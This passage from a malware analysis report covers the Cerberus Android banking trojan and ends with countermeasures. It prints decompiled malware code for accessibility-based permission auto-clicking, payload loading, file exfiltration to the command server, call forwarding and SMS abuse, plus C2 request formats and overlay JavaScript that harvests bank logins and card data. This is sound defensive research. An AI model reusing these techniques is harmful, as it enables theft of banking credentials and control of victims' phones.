decryptedStr(\"com.android.packageinstaller:id/permission_allow_button\")\n3.,decryptedStr(\"com.android.permissioncontroller:id/permission_allow_button\")\n4.,decryptedStr(\"android:id/button1\")\n5.,decryptedStr(\"com.android.settings:id/action_button\")};\n\nFigure 5.4.6 Java Code\n\nTo click the button, the var98 variable stores the important things to act.\n\n\nFigure 5.4.3 Play Protect settings\n\n\n-----\n\n1. do {\n2. ((AccessibilityNodeInfo)var92.next()).performAction(16);\n3. this._utils._writeSharedPreference(this,this._strings._dozeModeBool, \"\");\n4. this._utils._logcatError(this._thisClassSimpleName, decryptedStr(\"-=CLICK BUTTON=-\"));\n5. }while(!var98[index].contains(decryptedStr(\"com.android.settings:id/action_button\")));\n\nFigure 5.4.7 Java Code\n\nAnd then, using the performAction(16) function as you can see above, it clicks to ALLOW button to get permission. This process\ntakes place quickly and the user can not almost notice. Thus, when the malware gets the extra permission, it continues to give\nitself more permissions via this method.\n\nSome abused packages are presented in Figure 5.4.8.\n\n\ncom.android.vending\n\n\ncom.google.android.gms.security.settings.verifyappssettingsactivity\n\n\ncom.miui.permcenter.permissions.permissionseditoractivity\n\n\ncom.miui.permcenter.autostart.autostartmanagementactivity\n\n\ncom.miui.powerkeeper.ui.hiddenappsconfigactivity\n\n\ncom.miui.appmanager.applicationsdetailsactivity\n\n\ncom.miui.cleanmaster\n\n\ncom.miui.optimizecenter.deepclean.installedapp.installedappsactivity\n\n\ncom.android.packageinstaller\n\n\ncom.android.permissioncontroller\n\n\ncom.miui.securitycenter\n\n\ncom.google.android.packageinstaller\n\n\ncom.android.settings\n\n\ncom.teamviewer.host.market\n\n\ncom.samsung.klmsagent\n\n\nFigure 5.4.8 Abused Packages\n\nWhen looking at the table, some parameters/packages (like teamviewer, miui, samsung) drew our attention.\n\nA different user interface was used in Xiaomi MIUI. For this reason, the malware has a different java class to execute some functions\nrelated to Xiaomi. These functions did not do anything different from mentioned above.\n\nFor the TeamViewer package, it is observed that the malware checks the device for existing TeamViewer host / package.\n\n1. if (VERSION.SDK_INT < 18) {\n2. break label519;\n3. }\n4. if (!this.h.contains(decryptedStr(\"com.teamviewer.host.market\"))) {\n5. break label798;\n6. }\n7. var85 = CerberusCF._accessibilityAbuserMIUI\n8. .a(var1, decryptedStr(\"com.teamviewer.host.market:id/host_assign_device_username\"));\n9. var99 = CerberusCF._accessibilityAbuserMIUI\n10. .a(var1, decryptedStr(\"com.teamviewer.host.market:id/host_assign_device_password\"));\n11. var100 = CerberusCF._accessibilityAbuserMIUI\n12. .a(var1, decryptedStr(\"com.teamviewer.host.market:id/host_assign_device_submit_button\"));\n13. }\n\nFigure 5.4.9 Java Code\n\nAfter the activation of the malicious process, if the malware gets the username and the password, it launches the app like in the\n**Figure 5.4.10 and after this process malware can provide remote management to actors via TeamViewer.**\n\n\n-----\n\n1. try {\n2. if (this.p == 1) {\n3. this.c.a(var95);\n4. this.c.a(var97);\n5. this.p = 2;\n6. CerberusCF._Utils._launchApp(this, decryptedStr(\"com.teamviewer.host.market\"));\n7. }\n8. }catch (Exception var27) {\n9. var10001 = false;\n10. break label518;\n11. }\n\nFigure 5.4.10 Java Code\n\nWhat We Know About the Command & Control Server\n\nAs the advertisement / announcement from the forum suggests Command and Control servers can run with nginx and Apache. As\na part of our information gathering and client-side request analysis we have created a sample network structure for Cerberus\noperation.\n\nFigure 5.5.1 Network Structure\n\n\n-----\n\nFigure 5.5.2 Wireshark\n\nWhen malware is fully loaded, it starts sending requests to C2. At first request malware is still trying to gather some data about\nthe device. Thus, the response from C2 is no_device. After malware acquires all relevant data from the infected device, malware\nsends a new_device request to C2 and adds device as infected to the admin panel.\n\n**new_device query is shown in Figure 5.5.3.**\n\n\nq=new_device&ws={\"ID\":\"7u7b-zjye-rtajlg8r\",\"AR\":\"6.0\",\"TT\":\"clarkst26s\",\"CY\":\"us\",\"OP\":\"Android\",\"MD\":\"Unknown Custom\"}\n\n\nFigure 5.5.3 Parameter\n\nAfter the malware saves itself to the C2, it continues to send data to C2 about the device. Requests sent by the device can be found\nin Figure 5.5.4. info_device requests contains device data such as Device Battery Level, Device Language, Phone Number Of the\ndevice etc.\n\n\nq=info_device&ws={\"DM\":\"1\",\"AD\":\"null\",\"BL\":\"96\",\"TW\":\"54\",\"SA\":\"0\",\"SP\":\"2\",\"SS\":\"1\",\"LE\":\"en\",\"SY\":\"1\",\"SM\"\n:\"0\",\"ID\":\"7u7b-zjye-rtaj-lg8r\",\"IS\":\"4e8nnea8YkSxmrF\",\"NR\":\"\",\"GA\":\"\",\"PS\":\"0\",\"PC\":\"0\",\"PP\":\"0\",\"PO\":\"0\"}\n\n\nFigure 5.5.4 Parameter\n\nFor more information about parameters shown up please refer to Section 5.8.\n\nIn further requests, the malware had downloaded the **ring0.apk to the device after the** **upgrade_n_patch request. With the**\n**upgrade_n_patch request, the malware had sent the device ID that was saved to C2 panel in advance.**\n\n\nq=upgrade_n_patch&ws={\"ID\":\"7u7b-zjye-rtaj-lg8r\"}\n\n\nFigure 5.5.5 Parameter\n\nIf the ID matches the device, C2 fetches the ring0.apk to the device like in Figure 5.5.6.\n\n\n-----\n\nFigure 5.5.6 Wireshark\n\nThe details about the ring0.apk had been mentioned in 5.7 section.\n\nAfter ring0.apk is downloaded, the malware sends some info_device requests about the phone state again and executes some\nfunctions to collect and save data from all applications in the device. So, it sends the is_attacker requests with the following data\nto the C2.\n\n\nq=is_attacker&ws={\"ID\":\"7u7b-zjye-rtajlg8r\",\"AP\":\"com.android.quicksearchbox:com.android.messaging:ycrauzxbexes.fqfttggxafbeuqzc.ukwyblzcclpatxaczj\ntcmfwgt:com.android.browser:de.robv.android.xposed.installer:com.android.providers.downloads.ui:com.android.v\nending:opensecurity.clipdump:com.android.contacts:com.android.camera2:mobi.acpm.inspeckage:com.android.calend\nar:com.garanti.cepsubesi:com.xtoolapp.flashlight:com.android.development_settings:com.android.dialer:com.andr\noid.gallery3d:com.example.android.apis:com.amaze.filemanager:com.android.settings:com.android.calculator2:com\n.android.gesture.builder:com.android.email:eu.chainfire.supersu:com.android.music:com.android.deskclock:com.a\nndroid.customlocale2:com.android.development:\"}\n\n\nFigure 5.5.7 Parameter\n\nAs shown above, the malware had sent the package names of all applications and if one of those is a banking application, it had\ninitialized the injection process. A banking application has been installed before starting the analysis to observe the malware\nbehaviour. Here, the banking application is under the censor because of the privacy issues as you know. During the injection\nprocess, the malware had downloaded an application (injection) like the banking application detected before. Downloading starts\nafter the d_attacker request like in Figure 5.5.8 sent.\n\n\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 102\nHost: coko***************\nConnection: Keep-Alive\nAccept-Encoding: gzip\nUser-Agent: okhttp/3.6.0\nq=d_attacker&ws=MzYyMmEzN2ZlYjIzODYxNzg2YzY5MjU4MDQwNDNiZmRmZmM0NDM0Y2U1MjY2YjhhMzY4Yjg5ZWQy%0AMmUz%0A\n\nHTTP/1.1 200 OK\nDate: Mon, 03 Aug 2020 21:45:28 GMT\nServer: Apache/2.4.29 (Ubuntu)\nVary: Accept-Encoding\nContent-Encoding: gzip\nAccess-Control-Allow-Origin: *\nContent-Length: 23411\nConnection: close\nContent-Type: text/html; charset=UTF-8\nNzEyMWE2N2I4YTRkZmQyNGFjOGJkNDRiMDgxYTY0OWU4MTkxMDU1YmVkM2EzODkzMzU4MDlkYjkyMmZiZTQ2MDUxZDJjZTlhMzEwODU2ZGM5NWJh\nMGRhOWE2OWM1MGNjMjE0MDgxMWFhM\n…\n\n\nFigure 5.5.8 POST Request\n\n\n-----\n\nAs seen on the figure on top HTTP response is a large, encrypted data. This is the injection file of corresponding app request.\nInjection imitates the login / payment screen of the targeted app. After this response, malware again sends the package name of\nfile for corresponding injection. This time response includes targeted apps icon for literalism of injection.\n\nq=d_attacker_two&ws={\"AK\":\"com.garanti.cepsubesi\"}\n\nFigure 5.5.9 Parameter\n\nAlso if the device has a play store service (com.android.vending), the malware had requested some extra d_attacker requests. The\nresult of this requests, the “Add credit or debit card” page following had been downloaded to the device.\n\nFigure 5.5.10 Injection\n\nGathering Device Information\n\nMalware does some checks depending on the SDK version of the device. It looks for information such as Device Default Language,\nNetwork Connection Status, Current Time, Device External Data Storage, Device MCC Value for location.\n\nIn the Figure 5.6.1 code blocks, malware checks network status and type.\n\n1. private static boolean B(Context context) {\n2. if ((context = (ConnectivityManager)context.getSystemService(\"connectivity\"))\n3. .getNetworkInfo(0)\n4. .getState() == NetworkInfo.State.CONNECTED) return true;\n5. if (context.getNetworkInfo(1).getState() != NetworkInfo.State.CONNECTED) return false;\n6. return true;\n7. }\n\nFigure 5.6.1 Java Code\n\n1. public static boolean d(Context context) {\n2. NetworkInfo networkInfo = (context =\n(ConnectivityManager)context.getSystemService(\"connectivity\")).getNetworkInfo(1);\n3. if (networkInfo != null && networkInfo.isConnected()) {\n4. return true;\n5. }\n6. networkInfo = context.getNetworkInfo(0);\n7. if (networkInfo != null && networkInfo.isConnected()) {\n8. return true;\n9. }\n10. if ((context = context.getActiveNetworkInfo()) == null) return false;\n11. if (!context.isConnected()) return false;\n12. return true;\n13. }\n\nFigure 5.6.2 Java Code\n\n\n-----\n\nAs malware advertisement campaigns show; in the command & conquer panel attackers are able to see device country\ninformation as flags. This is done with a few checks. First is getting IP geolocation data, after acquiring the geolocation data C2\ncompares this data with the parameter received from malware. Malware acquires device country information via querying\ndevice MCC-MNC (Mobile Country Code) values.\n\nCode block responsible for MCC check:\n\n1. //Check country ISO\n2. //Returns the ISO-3166-1 alpha-2 country code equivalent of the MCC\n3. public static String a(Context context) {\n4. if (!(context = (TelephonyManager)context\n5. .getSystemService(\"phone\"))\n6. .getNetworkCountryIso()\n7. .isEmpty()) return context.getNetworkCountryIso();\n8. return \"~no~”.\n9. }\n\nFigure 5.6.3 Java Code\n\nMalware is also configured to work on Xiaomi systems. One of the first things malware does is to check phones Android\nConfiguration.\n\nCode block for checking MIUI.UI version:\n\n1. public static int a() {\n2. try {\n3. Process process = Runtime.getRuntime().exec(\"getprop ro.miui.ui.version.name\");\n4. Object object = new InputStreamReader(process.getInputStream());\n5. BufferedReader bufferedReader = new BufferedReader((Reader)object, 1024);\n6. object = bufferedReader.readLine();\n7. bufferedReader.close();\n8. return Integer.parseInt(((String)object).replace(\"V\", \"\"));\n9. }\n10. catch (Exception exception) {\n11. return 0;\n12. }\n13. }\n\nFigure 5.6.4 Java Code\n\nMalware changes behaviour depending on the system language. It looks at system default language and shows notifications\naccording to this data.\n\n1. //Unicode character custom > \\u015f > ş (latin character)\n2. public final String c() {\n3. try {\n4. Object object = new JSONObject(this.a.aX);\n5. CharSequence charSequence = Locale.getDefault().getLanguage().toLowerCase();\n6. if (((String)charSequence).equals(\"tr\")) {\n7. object = new StringBuilder(\"L\\u00fctfen \");\n8. ((StringBuilder)object).append(this.a.i); // >> (or any other malware application name )\n9. ((StringBuilder)object).append(\" Etkinle\\u015ftirin\");\n10. return ((StringBuilder)object).toString();\n11. }\n12. object = object.getString((String)charSequence);\n13. charSequence = new StringBuilder();\n14. ((StringBuilder)charSequence).append((String)object);\n15. ((StringBuilder)charSequence).append(\" \");\n16. ((StringBuilder)charSequence).append(this.a.i);\n17. return ((StringBuilder)charSequence).toString();\n18. }\n19. catch (Exception exception) {\n20. StringBuilder stringBuilder = new StringBuilder();\n21. stringBuilder.append(this.a.J);\n22. stringBuilder.append(\" \");\n23. stringBuilder.append(this.a.i);\n24. return stringBuilder.toString();\n25. }\n26. }\n\nFigure 5.6.5 Java Code\n\n\n-----\n\nDownloaded Module\n\nCerberus malware is capable of downloading new code at runtime. After malware acquires needed permissions it may download\na module called ‘ring0.apk’.\n\nCode block responsible for patching the malware:\n\n1. public class _loadDownloadedStage_runsmsq extends Activity {\n2. protected void onCreate(Bundle var1) {\n3. super.onCreate(var1);\n4. if (VERSION.SDK_INT >= 29) {\n5. _Utils var6 = new _Utils();\n6. try {\n7. File var2 = new File(this.getDir(\"apk\", 0), var6._stringsClassf._downloadedStageFileName);\n8. if (var2.exists()) {\n9. var2 = new File(this.getDir(\"apk\", 0), var6._stringsClassf._downloadedStageFileName);\n10. File var3 = this.getDir(\"outdex\", 0);\n11. DexClassLoader var8 = new DexClassLoader(var2.getCanonicalPath(), var3.getAbsolutePath(),\n\n(String)null, var6.getClass().getClassLoader());\n12. Class var7 = var8.loadClass(\"patch.ring0.run\");\n13. var7.getMethod(\"runsmsq\", Activity.class).invoke(var7.newInstance(), this);\n14. }\n15.\n16. } catch (Exception var5) {\n17. StringBuilder var4 = new StringBuilder(\"Error: \");\n18. var4.append(var5.toString());\n19. var6._logcatError(\"DexClassLoader\", var4.toString());\n20. }\n21. } else {\n22. this.finish();\n23. }\n24. }\n25. }\n\nFigure 5.7.1 Java Code\n\nCode block for loading new payload:\n\n1. File var141 = new File(this.getDir(\"apk\", 0), var130._stringsClassf._downloadedStageFileName);\n2. var140 = this.getDir(\"outdex\", 0);\n3. DexClassLoader var138 = new DexClassLoader(var141.getCanonicalPath(), var140.getAbsolutePath(),\n4. (String)null, var130.getClass().getClassLoader());\n5. Class var142 = var138.loadClass(\"patch.ring0.run\");\n6. var143 = var142.getMethod(\"main\", Context.class, String.class);\n7. var144 = var142.newInstance();\n\nFigure 5.7.2 Java Code\n\nRemote Control\n\nRemote Control from C2 is achieved by sending HTTP / HTTPS requests from bot to C2. Malware is also able to give actors device\nremote control via TeamViewer application. For more information about malwares’ capability of abusing TeamViewer, please refer\nto Section 5.4. Malware sends different parameters in requests to collect as much data as possible about the device. We should\nalso state that our analysis about parameters also correlates with Cerberus developers’ claims.\n\n\n**AR: Android Version**\n**SC: Installed Apps**\n**TT: Campaign Name**\n**OP: Device OS / Android**\n**MD: Device Model**\n**DM: Bot has ring0 Check**\n**AD: Default SMS OK**\n**BL: Device Battery Level**\n**LE: Device Language**\n**NR: Phone Number of the Device**\n**SR: Play Protect Status**\n**SP: Package Name**\n**SY: Accessibility Settings OK**\n**TW B t Ti k V l**\n\n\n-----\n\n**AK: Protect Tick Value**\n**ES: Endless Foreground Service**\n**PS: SMS Related**\n**PC: SMS Related**\n**PP: MMS Related**\n**PO: MMS Related**\n**RS: Toast Notification Related**\n**IS: Device id_settings**\n**ID: Unique device bot ID**\n**SQ: Any app to delete OK (“1”, “0”)**\n**QR: App to delete**\n\n\nFigure 5.8.1 Parameters Sent as info_device\n\naccess_notifications call_forward\nchange_url_connect change_url_recover\nget_all_permission get_data_logs\ngrabbing_google_authenticator2 grabbing_lockpattern\ngrabbing_pass_gmail notification\npatch_update rat_connect\nremove_app remove_bot\nrequest_permission run_admin_device\nrun_app run_record_audio\nsend_mailing_sms sms_mailing_phonebook\nupdate_inject url\nussd\nFigure 5.8.2 Remote Control Functions\n\nAs campaigns and developers of Cerberus malware suggest malware is capable of grabbing and sending different files to C2.\nMalware sends files base64 value instead of raw data. This mechanism can be used to exfiltrate files saved in target devices such\nas pictures, text files and more. Base64 data is sent to the C2 through HTTP / HTTPS requests.\n\nCode block responsible for file exfiltration:\n\n1. if (f.contains(this.decryptedStr(\"uploadind_file\"))) {\n2. final JSONObject jsonObject2 = new JSONObject(f);\n3. try {\n4. final File file = new File(jsonObject2.getString(this.decryptedStr(\"uploadind_file\")));\n5. final String encodeToString = Base64.encodeToString(CerberusCF._Utils.a(file), 0);\n6. final JSONObject jsonObject3 = new JSONObject();\n7. jsonObject3.put(this.decryptedStr(\"cmd\"), (Object)this.decryptedStr(\"saved_file\"));\n8. jsonObject3.put(this.decryptedStr(\"ID\"), (Object)i);\n9. jsonObject3.put(this.decryptedStr(\"name\"), (Object)file.getName());\n10. jsonObject3.put(this.decryptedStr(\"file_base64\"), (Object)encodeToString);\n11. final _Utils a4 = this._utils;\n12. final StringBuilder sb4 = new StringBuilder();\n13. sb4.append(this._strings._RATCmd);\n14. sb4.append(this._utils._encryptWithC2CommunicationKey(jsonObject3.toString()));\n15. a4._postRequestQueryC2Log((Context)this, sb4.toString());\n16. }catch (Exception ex3) {\n17. this._utils._logcatError(this._thisClassSimpleName, this.decryptedStr(\"uploading_file error\"));\n18. }\n\nFigure 5.8.3 Java Code\n\n|access_notifications|call_forward|\n|---|---|\n|change_url_connect|change_url_recover|\n|get_all_permission|get_data_logs|\n|grabbing_google_authenticator2|grabbing_lockpattern|\n|grabbing_pass_gmail|notification|\n|patch_update|rat_connect|\n|remove_app|remove_bot|\n|request_permission|run_admin_device|\n|run_app|run_record_audio|\n|send_mailing_sms|sms_mailing_phonebook|\n|update_inject|url|\n|ussd||\n\n\n-----\n\nGrabber\n\nAs mentioned in Section 5.5, malware gets new injection / overlay templates depending on the parameter “SC”. C2 cross-checks\nits injection database for corresponding applications. It was explained how to get the injection codes from C2 in Section 5.5. Some\nimportant parts of the JavaScript code related to personal data inside the HTML file that was gathered from C2 like following.\n\n1. var form1 = document.getElementById('form1'),\n2. form2 = document.getElementById('form2'),\n3. form3 = document.getElementById('form3'),\n4. login = document.getElementById('login'),\n5. password = document.getElementById('password'),\n6. loginKurumsal = document.getElementById('loginKurumsal'),\n7. userNameKurumsal = document.getElementById('userNameKurumsal'),\n8. passwordKurumsal = document.getElementById('passwordKurumsal'),\n9. sendData = document.getElementById('sendData'),\n10. sendDataKurumsal = document.getElementById('sendDataKurumsal'),\n11. cc = document.getElementById('cc'),\n12. exp = document.getElementById('exp'),\n13. cvv = document.getElementById('cvv'),\n14. sendDataFull = document.getElementById('sendDataFull');\n\nFigure 5.9.1 JavaScript Code\n\n1. var mmYY = exp.value.split('/');\n2. var month = parseInt(mmYY[0]);\n3. var year = parseInt(mmYY[1]);\n4.\n5. var expArray = exp.value.split('/');\n6. var today, someday;\n7. var exMonth = expArray[0];\n8. var exYear = \"20\" + expArray[1];\n9.\n10. today = new Date();\n11. someday = new Date();\n12. someday.setFullYear(exYear, exMonth, 1);\n\nFigure 5.9.2 JavaScript Code\n\n1. var data = {};\n2. data.login = login.value;\n3. data.password = password.value;\n4. data.loginKurumsal = loginKurumsal.value;\n5. data.userNameKurumsal = userNameKurumsal.value;\n6. data.passwordKurumsal = passwordKurumsal.value;\n7. data.cc = cc.value;\n8. data.exp = exp.value;\n9. data.cvv = cvv.value;\n10. data.cardCode = cardCode.value;\n\nFigure 5.9.3 JavaScript Code\n\nIn the code above, collected data can be summarized like;\n\n   - User (Citizen ID, Customer ID etc.)\n\n   - Password\n\n   - Credit Card Number\n\n   - CVV\n\n   - Card Expiration Date\n\n   - Card Password\n\nIn addition to the injection pages, as you can see In figure 6, the malware tries to collect extract data about device users’ credentials.\nAbout this issue, some important parts of the JavaScript code related to personal data inside the HTML file that was uploaded from\nC2 is like the following.\n\n\n-----\n\n1. var cc = document.getElementById('cc'),\n2. errorCC = document.getElementById('errorCC'),\n3. exp = document.getElementById('exp'),\n4. errorEXP = document.getElementById('errorEXP'),\n5. errorName = document.getElementById('errorName'),\n6. errorCountry = document.getElementById('errorCountry'),\n7. errorStreet = document.getElementById('errorStreet'),\n8. errorCity = document.getElementById('errorCity'),\n9. expAndCvcBlock = document.getElementById('expAndCvcBlock'),\n10. holderInfo = document.getElementById('holderInfo'),\n11. holderName = document.getElementById('holderName'),\n12. country = document.getElementById('country'),\n13. address = document.getElementById('address'),\n14. aptSuite = document.getElementById('aptSuite'),\n15. postalCode = document.getElementById('postalCode'),\n16. city = document.getElementById('city'),\n\nFigure 5.9.4 JavaScript Code\n\n1. var data = {};\n2. data.cc = cc.value;\n3. data.exp = exp.value;\n4. data.cvc = cvc.value;\n5. data.holderName = holderName.value;\n6. data.country = country.value;\n7. data.address = address.value;\n8. data.aptSuite = aptSuite.value;\n9. data.city = city.value;\n10. data.postalCode = postalCode.value;\n\nFigure 5.9.5 JavaScript Code\n\nIn the above code, the malware collects extra data such as;\n\n   - Country\n\n   - Address\n\n   - Apartment/Suite\n\n   - Postal Code\n\n   - City\n\nDialer - SMS Interception\n\nCerberus launches phone applications to forward calls and run USSD codes, it automatically approves these actions using\naccessibility settings. Cerberus can monitor incoming SMS messages and is also able to send SMS. There is also a command to send\nbulk SMS to all numbers in the contacts that was discovered in the analysis process.\n\nAfter receiving **call_forward command from C2 with target phone number, malware stars phone activity on phone using**\n*21*PHONE_NUMBER# and reports the result back to C2.\n\n1. String v4_1 = this_Utils;\n2. String v5_5 = v6_83.getString(decryptedStr(\"n\"));\n3. String v6_9 = new android.content.Intent(android.intent.action.CALL);\n4. v6_9.addFlags(268435456);\n5. String v8_3 = new StringBuilder(*21*);\n6. v8_3.append(v5_5);\n7. v8_3.append(#);\n8. v6_9.setData(android.net.Uri.fromParts(tel, v8_3.toString(), #));\n9. p19.startActivity(v6_9);\n10. String v6_11 = new StringBuilder(ForwardCALL: );\n11. v6_11.append(v5_5);\n12. v6_11.append([143523#]);\n13. String v6_12 = v6_11.toString();\n14. v4_1.a(ForwardCall, v6_12);\n15. v4_1.f(p19, v4_1.a.X, v6_12);\n16. return;\n\nFigure 5.10.1 Java Code\n\n\n-----\n\nAfter malware receives relevant USSD code from C2, malware starts call activity using received USSD code and reports the result\nback to C2.\n\n1. String v4_2 = this_Utils;\n2. String v5_10 = v6_83.getString(decryptedStr(\"u\"));\n3. String v6_19 = new android.content.Intent(android.intent.action.CALL);\n4. v6_19.addFlags(268435456);\n5. StringBuilder v7_17 = new StringBuilder(tel:);\n6. v7_17.append(android.net.Uri.encode(v5_10));\n7. v6_19.setData(android.net.Uri.parse(v7_17.toString()));\n8. p19.startActivity(v6_19);\n9. String v6_21 = new StringBuilder(USSD: );\n10. v6_21.append(v5_10);\n11. v6_21.append([143523#]);\n12. String v5_12 = v6_21.toString();\n13. v4_2.a(USSD, v5_12);\n14. v4_2.f(p19, v4_2.a.X, v5_12);\n15. return;\n\nFigure 5.10.2 Java Code\n\nAfter malware receives the command sms_mailing_phonebook from the C2, malware sends SMS to all contacts saved on the\ndevice.\n\n1. .\n2. .\n3. .\n4. this._Utils._sendSMStoAllContacts((this, v6_83.getString(decryptedStr(\"t\")));\n5. .\n6. .\n7. .\n\nFigure 5.10.3 Java Code\n\nAfter malware receives the command send_sms from C2, malware is capable of sending the SMS to relevant number.\n\n1. .\n2. .\n3. .\n4. this_Utils_SMSSender(p19, v6_83.getString(decryptedStr(\"n\")), v6_83.getString(decryptedStr(\"t\")));\n5. .\n6. .\n7. .\n\nFigure 5.10.4 Java Code\n\nIf SMS permissions are OK, malware is capable of running the SMS data received. Sends the results back to C2\n\n1. if (_intent.getAction().equals(this._strings._providerSMSRECEIVED)) {\n2. label117: {\n3. _Utils var5 = this._utils;\n4. Bundle _myBundle;\n5. boolean var10001;\n6. try {\n7. _myBundle = _intent.getExtras();\n8. } catch (Exception var15) {\n9. var10001 = false;\n10. break label117;\n11. }\n12. if (_myBundle != null) {\n13. label114: {\n14. Object[] _pdus;\n15. try {\n16. _pdus = (Object[])_myBundle.get(\"pdus\");\n17. } catch (Exception var14) {\n18. var10001 = false;\n19. .\n20. .\n21. .\n\nFigure 5.10.5 Java Code\n\n\n-----\n\nRemote App Removal and Self Destruction\n\nCerberus can delete applications installed on the device, to do that malware opens the uninstall page for the application and\npresses the uninstall button via using accessibility settings. C2 can issue two different commands to start this process:\n“remove_bot” or “remove_app”.\n\n   - “remove_bot”: Automatically gets the current Cerberus package name and starts the uninstall procedure.\n\n   - “remove_app”: It starts the uninstall procedure for the application requested to be removed by the C2.\n\n1. .\n2. Intent _deleteIntent;\n3. try {\n4. _deleteIntent = new Intent(\"android.intent.action.DELETE\");\n5. _deleteIntent.setData(Uri.parse(\"package:\".concat(String.valueOf(_prefValue))));\n6. this.startActivity(_deleteIntent);\n7. } catch (Exception var101) {\n8. try {\n9. _deleteIntent = new Intent(\"android.intent.action.DELETE\");\n10. _deleteIntent.setData(Uri.parse(\"package:\".concat(String.valueOf(_prefValue))));\n11. _deleteIntent.addFlags(268435456);\n12. _deleteIntent.addFlags(8388608);\n13. this.startActivity(_deleteIntent);\n14. } catch (Exception var100) {\n15. var10001 = false;\n16. }\n17. }\n18. .\n19. .\n\nFigure 5.11.1 Java Code\n\n\n-----\n\n## Mitigation and Countermeasures\n\nCountermeasures;\n\n   - Users should be careful when opening content that promises to win money or any gifts.\n\n   - Installation of apps from third party sources should be disabled in Android settings.\n\n   - Anti-malware software (like Google Play Protect) should be installed, running and updated on devices.\n\n   - Before installing an application, authenticity of application should be checked. In case of doubt, the installation of the\napplication should not be continued.\n\n   - While installing an application, application should be treated as suspicious if it asks for accessibility permission while\ninstalling, especially if it insists on obtaining this permission.\n\n   - Unnecessary permissions should not be given to applications during their use. Temporary permits must be withdrawn\nafter the work is done.\n\n   - The software of the devices should be kept up to date and changes that would adversely affect security measures\nshould not be made.\n\n   - In the case of mass managed devices, security measures should also be checked for the MDM server.\n\nCountermeasures for Application Developers;\n\n    - Accessibility event filtering or sanitization\n\n    - Behavioral Listeners\n\n    - Window Punching\n\n    - In-App Keyboards\n\n    - Fingerprint API\n\n    - Use of Android's FLAG_SECURE where required\n\nFor more information, refer to: https://faui1-files.cs.fau.de/public/publications/a11y_final_version.pdf ( How Android’s UI Security\nis Undermined by Accessibility )\n\nMitigation;\n\n   - Make regular backups. This malware can delete the files on the system on command.\n\n   - Limit the impact of infection by disconnecting devices from internet or C2 servers, and rapidly start the removal process\nof the malware.\n\n   - Reset any credentials including passwords.\n\n   - Before restoring from system backup, backup should be checked to be free from malware.\n\n   - To be ensure there isn't any infection remains; especially check accessibility permission or device admin enabled apps,\nscan system with an anti-malware software and monitor network traffic.\n\n\n-----\n\n## Future of Cerberus\n\nOn August 10 2020, Cerberus group officially announced the project is indeed dead because of Google Play Protects new\nfunctionality. They published all the source code about Cerberus Project within the same announcement for the premium users of\nthe forum.\n\nFigure 7.1 Post About Published Source Code, retrieved from xss[.]is\n\nWhy is the project dead? Well, they made it clear themselves.\n\nAnnouncement from Cerberus developers about the project can be found in the Figure 7.1.\n\n## EN\nOur bot died due to one problem, the Play Protect began to scan the resources of the APK file.\nInitially, Cerberus was developed as a modular bot, with the loading of malicious code into resources, and at\nthat time the play-protec was not able to scan application resources.\nAt the moment, our module has signatures, and bots \"die\" when it is loaded. The solution is to remove the\nmodule from the code and encrypt the entire APK, but then the size of the APK will be very large.\nSolution number two: encrypt the module.\nWhy didn't we do it?\nWe had one module for all clients, and since the team was crumbling, it was not possible to find new\nprogrammers who would make their own module for each client individually.\nAs a result, our clients could not encrypt the module for themselves. We encrypted the module 5 times, and\neach crypt was fired the next day by signatures, and in the end our hands dropped, since this is not a\nsolution to the problem.\n## RU\nУ нас бот умер из за одной проблемы, плей протект стал сканировать ресурсы у АПК файла.\nИзначально церберус разрабатывался как модульный бот, с подгрузкой вредоностного кода в\nресурсы,\nи на тот момент плей протект не умел сканировать ресурсы приложения.\nНа текущий момент на нашем модуле стоят сигнатуры, и боты \"умирают\" при его загрузке. Решение убрать модуль из кода, и криптовать весь АПК, но тогда размер АПК будет очень большой.\nРешение номер два: криптовать модуль.\nПочему мы не стали это делать?\nУ нас был один модуль для всех клиентов, и так как команда рапалась, не получилось найти новых\nпрограммистов, которые бы сделали индивидуально под каждого клиента свой модуль.\nВ итоге у нас клиенты не могли криптовать модуль под себя. Мы криптовали модуль 5 раз, и каждый\nкрипт палился на следующий день по сигнатурам, и в итоге руки опустились, так как это не решение\nпроблемы.\n\nFigure 7.1 Why Project is Dead?\n\nEven after the release active campaigns from the same domains / groups are still active, which suggests old Cerberus clients are\nstill active with their old setup.\n\nFrom now on Cerberus Source code is open to everyone in the wild. Which is a greater threat until the Android 11 release. We are\nexpecting self-crypted / frankenstein bots to be used in the wild and see code pieces of Cerberus in different Android Malware\nsamples.\n\n\n-----\n\n## Sources \n\n  - https://xss.is/threads/29932/ ( malware - Cerberus Source Code | XSS.is (ex DaMaGeLaB) )\n\n  - https://koodous.com/apks?search=tag:Cerberus ( Koodous )\n\n  - https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2 ( ISO 3166-1 alpha-2 - Wikipedia )\n\n  - https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks ( Mitigating malware and\nransomware attacks )\n\n  - https://developer.android.com/guide/practices/verifying-apps-art ( Verifying app behavior on the Android runtime\n(ART) )\n\n  - https://github.com/androguard/androguard ( Androguard, Reverse engineering, Malware and goodware analysis of\nAndroid applications ... and more (ninja !) )\n\n  - https://faui1-files.cs.fau.de/public/publications/a11y_final_version.pdf ( How Android’s UI Security is Undermined by\nAccessibility )\n\n\n-----\n\n## Appendix.A – Count of Detected Cerberus - Daily\n\n500\n\n## April 3, 2020 Cerberus V2 Released\n\n450\n\n400\n\n350\n\n300\n\n250\n\n200\n\n150\n\n100\n\n50\n\n0\n\n- Dataset taken from https://koodous.com/\n\n\n-----\n\n## Appendix.B – Known Injection List\n\n**Spain** **United States** **Turkey** 